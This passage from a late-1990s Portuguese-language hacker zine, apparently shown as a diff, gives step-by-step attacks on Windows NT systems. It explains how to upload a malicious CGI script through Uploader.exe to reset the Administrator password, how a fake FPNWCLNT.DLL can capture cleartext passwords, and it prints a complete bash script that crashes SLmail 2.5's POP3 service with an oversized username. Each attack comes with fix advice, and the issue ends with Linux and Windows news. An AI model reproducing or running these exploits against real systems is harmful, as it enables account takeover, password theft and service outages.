+zine dessa.. e tipo do kct:) Meu principal alvo sao os NT Admins, pois como
+esse sistema, alem dos programas direcionados a ele possuem muitos bugs, e'
+preciso sempre alguem alerta-los.
+
+Bem, isso nao eh necessariamente um BUG, dessa vez,a fabricante do programa
+fez  a burrada consciente, ou seja,nao conseguiu enxergar os riscos daquilo
+que fez hehe! Bem, primeiro vamos entender o que eh o Uploader.exe...
+
+E' um arquivo executavel encontrado nos sistemas de NT rodando o Website1.1
+quando e executado ele abre um form que pede o local dir de um arquivo para
+ser Uplodeado (enviado ao server). Ai vc diz: "Sim! qualquer FTP faz isso",
+bem, ate certo ponto eh,mas com uma pequena diferenca, o UPLoader armazenda
+os arquivos num direto'rio acessivel por HTTP (somente.. e basta).
+
+Explicando melhor:
+
+Bem, qualquer leigo sabe, que se eu mandar um QUERY de tipo...
+www.victima.com.br/vitima/a.htm" o server vai retornar o codigo que vai ser
+processado pelo meu Browser de a.htm (ohh!!!).
+No entanto,se eu mandar um query de tipo ftp://ftp.victim.com/vitima/a.htm,
+se esse dir  existir meu browser vai oferecer Download ao arquivo! Entendeu
+agora? tipo... vc os files uploadeado por http mermo.
+Outro dos pontos mais importantes esta.. em que o UPLOADER possui permissao
+EVERYONE.
+
+--[Xpl0itinG]--
+
+Eh muito simples...
+Primeiro vc cria um CGI-Script malefico, que execute algo do tipo:
+"net user Administrator rwxr0x /y" isso.. ia mudar a senha do Administrator
+pra 'rwxr0x'.. bem o que o script faz fica a seu criterio, depois, mande um
+QUERY pra 'http://www.victim.org/cgi-win/uploader.exe', onde vc encontrara'
+os Forms do UPLOADER, mande o CGI-Script e depois va com seu browser para o
+diretorio indicado pelo proprio UPLOADER apos o envio do arquivo.
+
+Vualah...vc muda a senha do root!:)
+
+--[So, Let'z FiX!]--
+
+1) Mude a permissao do /cgi-win/uploader.exe (para operators only)
+2) Remova-o.
+3) Tente modificar o Upload dir para um que soh seja acessivel por FTP,
+assim, o servico ainda funciona, e vc fica seguro!:)
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+10#. FALSO fpnwclnt.dll
+~~~~~~~~~~~~~~~~~~~~~~
+-= kbyte 1995-1997 (c) =-
+-= kbyte@biogate.com   =-
+
+Olas , como prometemos , mais NT proces.
+
+BUG -
+  O 'registry' inclui uma entrada default para
+<HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa> que contem o
+valor <Notification Packages: REG_MULTI_SZ: FPNWCLNT>. Este dll que
+normalmente so existe no ambiente com NetWare.Um falso FPNWCLNT.DLL pode
+ser guardado no %systemroot%\system32 (%systemroot% = \winnt no default)
+e entao coletaria passwords em clear text.
+
+SISTEMAS AFETADOS
+  WinNT 3.5, 3.51 e 4.0
+
+CORRECAO
+  Updatar para WinNT 5.0 ou entao tirar a entra do
+<HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa> que aponta pro
+FPNWCLNT.DLL e proteja este arquivo como read-only.
+
+O .c vai anexado a RwX
+getntpass.c
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+11#. SLmail 2.5
+~~~~~~~~~~~~~~~
+-= X-SaTaNiC 1995-1997 (c) =-
+
+Sistema Bugado: NT rodando SLMail 2.5
+
+[What?]
+
+Versoes do SLmail 2.5 sofrem ao "buffer overrun" ataque no servico de Pop3.
+E' muito simples,s e o username usado e' muito  grande, o servico terminara
+por "memory exception", ou travara' com um CRITICAL ERROR.
+Ainda que  nao existam remote exploits  que executem  comandos remotamente,
+mesmo assim  e' muito bom  tomarmos cuidado com esse bug, pois depois que o
+servico terminara serah necessario abri-lo novamente e nem sempre os Admins
+estao  lah na hora para ver  isso. Como no "Denial-Of-Service" da  RWX02, e
+muito  ruim prum provedor os usuarios ficarem privados de receber e  enviar
+seus mails!
+
+[Xpl0iTiNg]
+#!/bin/bash
+# slmbug.sh
+# -= X-SaTaNiC =-
+echo * Crash Mail [by X-SaTaNiC] *
+echo Digite o HOST do NT Server: ; read HOST
+echo Travando...
+echo "USER rwxr0xsohardasyoucanthinkaboutmadeinbrasilyeahthepassmustbereallargehehetipotemquesifthisdoesnotworeralgorealmentegrandersakouounao"  "PASS rwx" | telnet $HOST 110
+killall -9 telnet
+echo " !Mail Services de $HOST Travado! "
+echo "||      Download RwX Now!       ||"
+echo "||    www.cyberspace.org/~rwx   ||"
+echo " @==============================@ "
+# EoF
+
+[Hunn.. How Can I fix IT??]
+Upgrade  sua versao, o fabricante afirma que apartir da versao 2.6, o bug
+estah corrigido* - http://www.seattlelabs.com
+Eu instalei a v2.6 aqui, e realmente esse BUG foi corrigido nessa versao!
+
+Humm.. Proxima edicao tem mais.. pelo menos eu espero!!:)))
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+12#. WORLD NEWS
+~~~~~~~~~~~~~~~
+           Olas , esta area nao tem nada haver com seguranca , mas
+provavelmente vai agradar aos InterNautas. Usaremos esta area para
+acrescentar novidades no mundo da InterNet , ou/e qualquer outro assunto
+relacionado a 'Computador' em geral. Mas esta area nao eh nossa , queremos
+que essa area seja quase que exclusiva do usuario , mandando-nos novidades
+sobre Novos O.S.es,Nova Onda da Inet,ate piadas(e frases/tags)
+relacionadas a computador sao bem-vindas. Pois a Inet tambem eh diversao
+(Mas ficar fucando no Linux altas horas pra mim tambem eh diversao hehehe)
+
+NEWS   --
+
+* Novo Linux
+Bem , fora as tres tradicionais distribuicoes do Linux (Debian , RedHat ,
+Slackware) esta sendo lancado o TURBO LINUX. Essa versao do Linux tem
+todas as utilidades do outros linux , so que com exclusivas facilidades
+para New Users , como , um Desktop amigavel a facil , easy-to-use
+plataforma. Infelizmente so esta disponivel para 386 plataformas , mas
+eles prevem versoes para PPC e Dec Alpha. Voce pode downloadar no site
+deles , www.turbolinux.com
+
+Algumas Novidades do TurboLinux
+
+- Facil instalacao (Nao precisa de floppy..Usa-se Loadlin ou Boot direto
+do cd)
+- TurboProbe - Detecta SCSI , Ethernet , tudo facilmente , o que vc
+precisaria setar a mao.
+- TurboPPPConfig - Seta a PPP instalacao , sem ter que usar o Xwin
+- RPM-Compatible - Compativel com RedHat Package Manager
+- TurboDESK - Desktop environment para Xwin projetado para rodar e parecer
+melhor que o OSF CDE.
+- administration tools - O TurboLinux tem uma ferramenta grafica para DNS
+Nameserver, um pacote de atualizacao automatica .
+
+Vale a pena conferir. Vou ver se pego e testo pra dizer mais pros e alguns
+contras desse novo O.S.
+
+ * Windows 98
+  - A microsoft prometeu e esta para vir , o Win98 esta com o visual um
+pouco diferente do Win95 , esta mais parecido com o Internet Explorer . Um
+amigo meu que esta usando a versao de testes , diz que ate agora nao caiu
+por Fragment Packets , mas parece que o Win98 eh vulneravel ao TearDrop e
+ao Land e eh mais 'pesado' que o Win95.
+ PS : Conselho : MicroSoft nao eh uma boa pedida...Experimente puxar o
+TurboLinux e tal , pelo menos e de graca.:)
+
+  * RedHat 5.0
+  - Uma das melhores distribuicoes do Linux , agora vai ganhar nova versao
+. A 5.0 esta prevista para o ano que vem , mas ja pode ser comprada em
+varios sites , inclusive na cheapbytes(www.cheapbytes.com)
+  - Contem varias novas ferramentas tais como Autodeteccao de Hardware ,
+KickStart , Configuracao para Multiplos XWindow Managers , Ferramenta de
+modo para usuarios comuns (Grafica), Realaudio Cliente e o Server(COOL!) e
+muito mais.
+
+ Vale a pena conferir.Se voce pode liberar uma graninha , pega esse Linux
+ai que vai fazer sucesso
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+13# FINALIZACOES
+~~~~~~~~~~~~~~~~
+Valeu por terem lido ai nosso zine! esperamos que tenham gostado das
+materias desse mes, valeu, proxima edicao sai no final de janeiro, te'
+mais. :)
+
+avisos: Materias de skynet, zaphod, netrunner, nao deu pra publicar dessa
+vez, fica pra proxima. Valeu para o sysop da Kemek bbs: +55-011-861-4358
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+<end>
+Merry Xmas! :))
